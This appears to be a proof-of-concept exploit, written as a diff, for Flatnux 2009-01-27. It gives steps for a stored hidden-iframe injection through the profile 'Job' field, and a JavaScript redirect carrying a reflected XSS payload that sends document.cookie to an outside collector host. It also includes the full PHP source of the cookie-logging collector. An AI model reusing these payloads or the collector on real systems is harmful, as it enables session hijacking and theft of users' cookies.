@@ -1,0 +1,41 @@
+
+/* 
+  - Flatnux-2009-01-27 XSS/Iframe injection p0c
+  + 1] Create acount 
+  + 1] Go to http://www.example.com/~flatnux/?mod=login&amp;op=modprof&amp;user=[username]
+       - Set iframe in the Job fields       
+         (Jobless l0l&lt;iframe src=http://www2.example.com/flatnux_ost.php style=&quot;visibility:hidden;width:0px;height:0px&quot;&gt;&lt;/iframe&gt;) 
+  + 3] Now m4k3 frieNdship witch Sheep
+
+  Greetings : cOndemned , sid.psycho , wszyscy których ników nie umie wymówić :P 
+              and Biggest 4 g0rion l0l
+
+  &quot;... droga jest ważniejsza od celu .... :P&quot;
+  Alfons Luja 
+*/       
+            
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+          path = &quot;http://www.example.com/~flatnux/index.php?mod=02_Flatforum\&quot;&gt;&lt;script&gt;location.href=\&quot;http://www2.example.com/collector.php?kuka=\&quot;%2Bdocument.cookie;&lt;%2Fscript&gt;&quot;;
+          location.href =  path;
+&lt;/script&gt;
+
+
+/*++++++++++++++++++collector.php++++++++++++++++++++++
+&lt;?php
+  if(isset($_GET[&#039;kuka&#039;])){
+     $gethim = $_GET[&#039;kuka&#039;];
+     $data = &quot;KUKI_GRABER:\n&quot;;
+     $data.= date(&quot;dmY H:i:s&quot;).&quot;\n&quot;;
+     $data.= &quot;REFERER: &quot;.$_SERVER[&#039;HTTP_REFERER&#039;].&quot;\n&quot;;
+     $data.= &quot;IP: &quot;.$_SERVER[&#039;REMOTE_ADDR&#039;].&quot;\n&quot;;
+     $data.= &quot;CIACHO: &quot;.$gethim.&quot;\n&quot;;
+     $hnd = fopen(&quot;KUKI_FLATNUX.TXT&quot;,&quot;a&quot;);
+      if(!hnd) exit(666);
+         flock($hnd,LOCK_EX);
+         fwrite($hnd,$data);
+         flock($hnd,LOCK_UN);
+         fclose($hnd);
+  }
+?&gt;
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
